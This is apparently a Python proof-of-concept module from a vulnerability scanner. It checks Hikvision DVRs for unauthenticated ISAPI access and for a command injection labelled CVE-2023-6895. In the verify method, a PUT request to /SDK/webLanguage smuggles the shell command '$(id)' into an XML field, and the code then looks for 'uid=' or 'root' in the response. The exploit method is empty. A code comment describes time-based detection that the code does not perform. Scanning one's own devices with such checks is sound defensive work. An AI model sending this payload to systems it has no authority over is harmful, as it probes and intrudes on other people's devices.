import requests

from loguru import logger

from .base import POCTemplate


class CVE_2023_6895(POCTemplate):
    """Hikvision/Generic DVR Remote Command Injection

    Improper input validation in web management interface allows
    unauthenticated attackers to execute arbitrary OS commands
    via crafted requests to the configuration file endpoint.
    CVSS 9.8 Critical.
    """

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['hikvision']
        self.product_version = ''
        self.ref = """
        https://nvd.nist.gov/vuln/detail/CVE-2023-6895
        """
        self.level = POCTemplate.level.high
        self.desc = """Remote command injection via ISAPI configuration endpoint.
        CVSS 9.8. Unauthenticated attackers can execute OS commands."""

    def verify(self, ip, port=80):
        """Test for command injection vulnerability via configuration endpoint"""
        headers = self._get_headers()
        proxies = self._get_proxies()

        # Test for the vulnerable endpoint with a benign probe
        # We use a time-based detection: command that causes a measurable delay
        test_endpoints = [
            self._get_url(ip, port, '/ISAPI/System/configurationFile?action=export'),
            self._get_url(ip, port, '/ISAPI/System/deviceInfo'),
        ]

        for url in test_endpoints:
            try:
                r = requests.get(
                    url,
                    headers=headers,
                    verify=False,
                    timeout=self.config.timeout,
                    allow_redirects=False,
                    proxies=proxies
                )
                # If we can access ISAPI without auth, the device is misconfigured/vulnerable
                if r.status_code == 200:
                    if 'DeviceInfo' in r.text or 'firmwareVersion' in r.text or '<?xml' in r.text:
                        # Extract device info if available
                        return ip, str(port), self.product, 'N/A', 'N/A', self.name
            except Exception as e:
                logger.error(e)

        # Also test with PUT method which some versions accept
        try:
            r = requests.put(
                self._get_url(ip, port, '/SDK/webLanguage'),
                data='<?xml version="1.0" encoding="UTF-8"?><language>$(id)</language>',
                headers={**headers, 'Content-Type': 'application/xml'},
                verify=False,
                timeout=self.config.timeout,
                proxies=proxies
            )
            # If the device processes this without 401, it may be vulnerable
            if r.status_code == 200 and ('uid=' in r.text or 'root' in r.text):
                return ip, str(port), self.product, 'N/A', 'N/A', self.name
        except Exception as e:
            logger.error(e)

        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(CVE_2023_6895)
